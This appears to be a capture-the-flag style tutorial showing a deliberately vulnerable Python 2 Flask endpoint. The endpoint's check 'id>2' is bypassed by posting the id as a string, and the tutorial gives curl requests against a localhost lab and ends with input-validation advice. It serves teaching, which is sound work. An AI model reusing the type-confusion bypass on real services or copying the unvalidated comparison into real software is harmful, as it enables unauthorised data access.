# Simple Server side exploitation: Exploit server to get Avenger's endgame secrets.
- In this example we show how not validating user input can exploited
- First lets start the api server by running the command below, also make sure you have flask installed
```bash
python2 app.py
```
### Challenge:
 - A `python2` flask server has an api endpoint `/endgame` which you can post the following `'{"id" : id}'` to get facts about the upcoming avengers endgame movie, the problem is that you can not read the first 2 facts as they are secrets only the movier directors know. Below is a section of the code that make sures you do not read the first 2 secrets.
```python
# request.user is the posted id
data = request.json
id=data['id']
if id>2:
    # endgame_details is an array containing the facts, you are not supposed to read the first 2 facts
    res={"endgame fact":endgame_details[int(id)-1]}
    return jsonify(res)
else:
    res={"error":"Wait for the movie"}
    return jsonify(res)
```
- Using curl to interact with the api we get
```bash
┌─[n1ght0wl@not-giving-a-fuck]─[~/Documents/presentations/thursday_speaker_9th_jan_19]
└──╼ $curl -X POST -H "Content-Type: application/json"  http://127.0.0.1:5000/endgame --data '{"id":1}'
{
  "error": "Wait for the movie"
}
┌─[n1ght0wl@not-giving-a-fuck]─[~/Documents/presentations/thursday_speaker_9th_jan_19]
└──╼ $curl -X POST -H "Content-Type: application/json"  http://127.0.0.1:5000/endgame --data '{"id":3}'
{
  "endgame fact": "Part of the journey is the end"
}
```
### Solution
- solution lies with how python2 compares variables, see below
```python
Python 2.7.15+ (default, Aug 31 2018, 11:56:52) 
[GCC 8.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 
>>> 1>2
False
>>> "1">2
True
>>> 
```
- Notice that python2 evaluates `"1">2` as `True` meaning in the endgame's api if we post a string it will alway evaluate that `id>2`
```bash
┌─[n1ght0wl@not-giving-a-fuck]─[~/Documents/presentations/thursday_speaker_9th_jan_19]
└──╼ $curl -X POST -H "Content-Type: application/json"  http://127.0.0.1:5000/endgame --data '{"id":"1"}'
{
  "endgame fact": "All Avengers are going to die"
}
```
- Notice we are now able to read the movie director's secret from the api.

## How to mitigate this
- **Always validate** User input before processing, especially when working with json which supports multiple types.